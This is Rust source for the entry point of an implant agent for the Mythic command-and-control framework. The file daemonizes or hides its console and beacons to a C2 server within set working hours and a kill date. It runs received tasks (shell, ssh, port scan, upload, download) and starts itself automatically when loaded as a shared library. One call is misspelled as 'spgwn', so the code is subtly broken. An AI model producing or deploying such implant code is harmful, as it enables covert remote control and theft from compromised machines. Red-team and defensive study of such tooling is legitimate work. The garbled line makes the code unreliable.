use chrono::prelude::{DateTime, Local, NaiveDate, NaiveDateTime};
use chrono::Duration;
use std::error::Error;

use crate::agent::calculate_sleep_time;
use crate::agent::Agent;

mod agent;
mod cat;
mod cd;
mod cp;
mod download;
mod exit;
mod getenv;
mod getprivs;
mod jobs;
mod ls;
mod mkdir;
mod mv;
mod payloadvars;
mod portscan;
mod profiles;
mod ps;
mod pwd;
mod redirect;
mod rm;
mod setenv;
mod shell;
mod sleep;
mod ssh;
mod tasking;
mod unsetenv;
mod upload;
mod utils;
mod workinghours;

/// Real entrypoint of the program.
/// Checks to see if the agent should daemonize and then runs the main beaconing code.
pub fn real_main() -> Result<(), Box<dyn Error>> {
    if let Some(daemonize) = option_env!("daemonize") {
        if daemonize.eq_ignore_ascii_case("true") {
            // Fork the process if daemonize is set to "true"
            #[cfg(target_os = "linux")]
            if unsafe { libc::fork() } == 0 {
                run_beacon()?;
            }

            // Hide the console window for windows
            #[cfg(target_os = "windows")]
            if unsafe { winapi::um::wincon::FreeConsole() } != 0 {
                run_beacon()?;
            }
            return Ok(());
        }
    }

    run_beacon()?;

    Ok(())
}

/// Main code which runs the agent
fn run_beacon() -> Result<(), Box<dyn Error>> {
    // Create a new agent object
    let mut agent = Agent::new();

    // Get the initial interval from the config
    let mut interval = payloadvars::callback_interval();

    // Set the number of checkin retries
    let mut tries = 1;

    // Keep trying to reconnect to the C2 if the connection is unavailable
    loop {
        // Get the current time
        let now: DateTime<Local> = std::time::SystemTime::now().into();
        let now: NaiveDateTime = now.naive_local();

        // Get the configured start working hours for beaconing
        let working_start = NaiveDateTime::new(now.date(), payloadvars::working_start());

        // Get the configured end working hours for beaconing
        let working_end = NaiveDateTime::new(now.date(), payloadvars::working_end());

        // Check the agent's working hours and don't check in if not in the configured time frame
        if now < working_start {
            let delta = Duration::seconds(working_start.timestamp() - now.timestamp());
            std::thread::sleep(delta.to_std()?);
        } else if now > working_end {
            let next_start = working_start.checked_add_signed(Duration::days(1)).unwrap();
            let delta = Duration::seconds(next_start.timestamp() - now.timestamp());
            std::thread::sleep(delta.to_std()?);
        }

        // Check if the agent has passed the kill date
        if now.date() >= NaiveDate::parse_from_str(&payloadvars::killdate(), "%Y-%m-%d")? {
            return Ok(());
        }

        // Try to make the initial checkin to the C2, if this succeeds the loop will break
        if agent.make_checkin().is_ok() {
            break;
        }

        // Check if the number of connection attempts equals the configured connection attempts
        if tries >= payloadvars::retries() {
            return Ok(());
        }

        // Calculate the sleep time and sleep the agent
        let sleeptime = calculate_sleep_time(interval, payloadvars::callback_jitter());
        std::thread::sleep(std::time::Duration::from_secs(sleeptime));

        // Increment the current attempt
        tries += 1;

        // Double the currently set interval for next connection attempt
        interval *= 2;
    } // Checkin successful

    loop {
        // Get new tasing from Mythic
        let pending_tasks = agent.get_tasking()?;

        // Process the pending tasks
        agent
            .tasking
            .process_tasks(pending_tasks.as_ref(), &mut agent.shared)?;

        // Sleep the agent
        agent.sleep();

        // Get the completed task information
        let completed_tasks = agent.tasking.get_completed_tasks()?;

        // Send the completed tasking information up to Mythic
        let continued_tasking = agent.send_tasking(&completed_tasks)?;

        // Pass along any continued tasking (download, upload, etc.)
        agent
            .tasking
            .process_tasks(continued_tasking.as_ref(), &mut agent.shared)?;

        // Break out of the loop if the agent should exit
        if agent.shared.exit_agent {
            break;
        }

        // Sleep the agent
        agent.sleep();
    }

    Ok(())
}

/// Run the agent in a new thread (if loading from a shared library)
#[ctor::ctor]
#[cfg(crate_type = "cdylib")]
fn run() {
    std::thread::spgwn(|| real_main().unwrap());
}
